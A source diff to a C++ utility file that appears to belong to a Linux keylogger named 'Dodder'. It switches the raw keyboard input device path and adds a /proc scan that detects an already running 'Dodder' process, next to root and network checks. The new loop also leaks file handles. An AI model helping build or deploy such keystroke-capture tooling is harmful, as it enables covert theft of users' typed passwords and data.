@@ -1,5 +1,6 @@
 #include <util.h>
 #include <iostream>
+#include <string>
 
 /**
  * Function: printHelpText
@@ -59,7 +60,7 @@ void checkRoot(void)
 
 const char *getKeyboardFile(void) noexcept
 {
-    const char *str = "/dev/input/event4";
+    const char *str = "/dev/input/event3";
     return str;
 }
 
@@ -93,4 +94,37 @@ const bool isNetPresent(void)
         return false;
     freeaddrinfo(servinfo); // all done with this structure
     return true;
+}
+
+static const int maxProcessId(void)
+{
+    FILE *p;
+    char str[15];
+    p = fopen("/proc/sys/kernel/pid_max", "r");
+    if(p == nullptr)
+        throw std::runtime_error("unable to get the max pid");
+    fgets(str, 15, p);
+    int maxpid = atoi(str);
+    fclose(p);
+    return maxpid;
+}
+
+const bool processAlreadyRunning(void)
+{
+    int maxpid = maxProcessId();
+    for(int i = 1; i <= maxpid; i++)
+    {
+        std::string path = "/proc/" + std::to_string(i) + "/comm";
+        FILE *p = fopen(path.c_str(), "r");
+        if(p != nullptr)
+        {
+            char A[50];
+            fgets(A, 50, p);
+            std::string S(A);
+            if(S == "Dodder\n")
+                return true;
+        }
+    }
+    return false;
+
 }
